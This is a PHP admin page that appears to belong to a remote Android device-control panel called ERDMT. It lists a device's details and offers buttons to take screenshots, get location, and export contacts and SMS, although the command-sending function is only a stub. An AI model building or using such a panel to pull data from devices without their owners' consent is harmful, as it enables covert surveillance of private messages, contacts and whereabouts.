<?php
session_start();
require_once 'config/firebase.php';
require_once 'includes/auth.php';
require_once 'includes/functions.php';

requireLogin();

$deviceId = $_GET['id'] ?? '';
if (!validateDeviceId($deviceId)) {
    header('Location: enhanced-dashboard.php');
    exit;
}

$device = getDeviceById($deviceId);
if (!$device) {
    header('Location: enhanced-dashboard.php');
    exit;
}

$pageTitle = 'Device Details - ERDMT Admin Panel';
include 'includes/header.php';
?>

<div class="container-fluid">
    <div class="row">
        <!-- Sidebar -->
        <nav class="col-md-3 col-lg-2 d-md-block bg-light sidebar">
            <div class="position-sticky pt-3">
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link" href="enhanced-dashboard.php">
                            <i class="fas fa-tachometer-alt"></i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="devices.php">
                            <i class="fas fa-mobile-alt"></i> Devices
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="commands.php">
                            <i class="fas fa-terminal"></i> Commands
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="files.php">
                            <i class="fas fa-folder"></i> Files
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="messages.php">
                            <i class="fas fa-comments"></i> Messages
                        </a>
                    </li>
                </ul>
            </div>
        </nav>

        <!-- Main Content -->
        <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4">
            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                <h1 class="h2">
                    <i class="fas fa-mobile-alt text-primary"></i>
                    Device Details
                </h1>
                <div class="btn-toolbar mb-2 mb-md-0">
                    <a href="enhanced-dashboard.php" class="btn btn-outline-primary">
                        <i class="fas fa-arrow-left"></i> Back to Dashboard
                    </a>
                </div>
            </div>

            <!-- Device Information Card -->
            <div class="card mb-4">
                <div class="card-header bg-white">
                    <h5 class="mb-0">
                        <i class="fas fa-info-circle text-primary"></i>
                        Device Information
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <h6>Basic Information</h6>
                            <table class="table table-borderless">
                                <tr>
                                    <td><strong>Device ID:</strong></td>
                                    <td><?php echo htmlspecialchars($deviceId); ?></td>
                                </tr>
                                <tr>
                                    <td><strong>Model:</strong></td>
                                    <td><?php echo htmlspecialchars($device['model'] ?? 'Unknown'); ?></td>
                                </tr>
                                <tr>
                                    <td><strong>Android Version:</strong></td>
                                    <td><?php echo htmlspecialchars($device['android_version'] ?? 'Unknown'); ?></td>
                                </tr>
                                <tr>
                                    <td><strong>Status:</strong></td>
                                    <td>
                                        <span class="badge bg-<?php echo ($device['status'] ?? 'unknown') === 'online' ? 'success' : 'danger'; ?>">
                                            <?php echo ucfirst($device['status'] ?? 'Unknown'); ?>
                                        </span>
                                    </td>
                                </tr>
                            </table>
                        </div>
                        <div class="col-md-6">
                            <h6>Connection Details</h6>
                            <table class="table table-borderless">
                                <tr>
                                    <td><strong>Last Seen:</strong></td>
                                    <td><?php echo isset($device['last_seen']) ? date('M j, Y H:i:s', $device['last_seen'] / 1000) : 'Never'; ?></td>
                                </tr>
                                <tr>
                                    <td><strong>Registration Date:</strong></td>
                                    <td><?php echo isset($device['registered_at']) ? date('M j, Y H:i:s', $device['registered_at'] / 1000) : 'Unknown'; ?></td>
                                </tr>
                                <tr>
                                    <td><strong>App Version:</strong></td>
                                    <td><?php echo htmlspecialchars($device['app_version'] ?? '1.0'); ?></td>
                                </tr>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Quick Actions Card -->
            <div class="card">
                <div class="card-header bg-white">
                    <h5 class="mb-0">
                        <i class="fas fa-bolt text-primary"></i>
                        Quick Actions
                    </h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-3 mb-3">
                            <button class="btn btn-command w-100" onclick="sendCommand('screenshot')">
                                <i class="fas fa-camera"></i><br>Take Screenshot
                            </button>
                        </div>
                        <div class="col-md-3 mb-3">
                            <button class="btn btn-command w-100" onclick="sendCommand('location')">
                                <i class="fas fa-map-marker-alt"></i><br>Get Location
                            </button>
                        </div>
                        <div class="col-md-3 mb-3">
                            <button class="btn btn-command w-100" onclick="sendCommand('contacts')">
                                <i class="fas fa-address-book"></i><br>Export Contacts
                            </button>
                        </div>
                        <div class="col-md-3 mb-3">
                            <button class="btn btn-command w-100" onclick="sendCommand('sms')">
                                <i class="fas fa-sms"></i><br>Export SMS
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>

<script>
function sendCommand(command) {
    const deviceId = '<?php echo $deviceId; ?>';
    // Implementation for sending commands to Firebase
    showNotification(`${command} command sent to device`, 'success');
}

function showNotification(message, type) {
    const notification = document.createElement('div');
    notification.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
    notification.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px;';
    notification.innerHTML = `
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}
</script>

<?php include 'includes/footer.php'; ?>